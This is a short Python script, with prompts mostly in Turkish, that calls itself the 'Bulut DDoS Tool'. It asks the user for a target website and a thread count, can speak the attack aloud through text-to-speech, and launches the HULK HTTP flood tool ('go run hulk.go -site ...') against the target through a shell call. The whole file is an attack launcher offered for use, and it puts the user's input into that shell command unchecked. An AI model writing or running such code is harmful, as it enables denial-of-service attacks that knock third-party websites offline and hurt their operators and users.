from colorama import Fore, Back, Style
#print(Fore.RED + 'some red text')
#print(Back.GREEN + 'and with a green background')
#print(Style.DIM + 'and in dim text')
#print(Style.RESET_ALL)
#print('back to normal now')
import os
import pyttsx3
import sys
import platform
def say_stuff(stuff_to_say):
    engine = pyttsx3.init()
    engine.say(str(stuff_to_say))
    engine.runAndWait()
print(Fore.GREEN + Back.BLACK)
if str(platform.system()) == 'Linux':
    os.system('figlet DDoS Tool Bulut')
else:
    os.system('pyfiglet DDoS Tool Bulut')

print(Fore.YELLOW +'[+]' + Fore.WHITE + ' DDoS Tool by' + Fore.YELLOW + ' Bulut                              ') 
print(Fore.YELLOW + '[+]' + Fore.WHITE + ' Bulut-DDoS Tool Beta Version                                             ')
print(Fore.YELLOW + '[+]' + Fore.WHITE + ' Bulut-DDoS Tool Interactive Menu in Python by Bulut                        ')
print(Fore.YELLOW + '[+]' + Fore.WHITE + ' Senin Sistemin: '+ Fore.WHITE + str(platform.system())+Fore.WHITE)
try:
    threads = input(Fore.YELLOW + '[+] ' + Fore.WHITE + 'Lütfen' + Fore.WHITE + ' sayıyı ' + Fore.WHITE + 'giriniz. >')
    site = input(Fore.YELLOW + '[+] ' + Fore.WHITE + 'Lütfen siteyi' + Fore.WHITE + ' yazınız! ' + Fore.WHITE + '>')
    colab_status = input(Fore.YELLOW + '[+] ' + Fore.WHITE + 'Google Collab kullanılsın mı? [Y/N]')
    attack_severity = input(Fore.YELLOW + '[+] ' + Fore.WHITE + 'Cihaz atağı için: 1, Site atağı için 2 >')
    if 'Y' == colab_status:
        print('OK, Now Not using Text-to-Speech to make ur Attack look' + Fore.RED+ ' Cool' + Fore.GREEN)
    if 'y' == colab_status:
        print('OK, Now Not using Text-to-Speech to make ur Attack look' + Fore.RED+ ' Cool' + Fore.GREEN)
    if 'n' == colab_status:
        if str(platform.system()) == 'Linux':
            print('[+] As You are on Linux, No, Text-to-Speech')
        else:
            say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))
    if 'N' == colab_status:
        if str(platform.system()) == 'Linux':
            print('[+] As you are on Linux, No, Text-to-Speech')
        else:
            say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))

    print('[+] Executing Command as Follows')
    print(Fore.GREEN +'HULKMAXPROCS={0} go run hulk.go -site {1}'.format(threads,site))
    if 'Windows' in str(platform.system()):
        os.system('go run hulk.go -site {0}'.format(site))
    else:
        os.system('HULKMAXPROCS={0} go run hulk.go -site {1}'.format(threads,site))
    print(Back.BLACK + Fore.GREEN)
    
except:
    print('[+] Execution Stopped with Error Code 0, Install GoLang or Your Internet is not working properly')
    print('[+] Installing Dependancies')
    os.system('python3 Install_Dependancies.py')
    os.system('python Install_Dependancies.py')
    os.system('py Install_Dependancies.py')

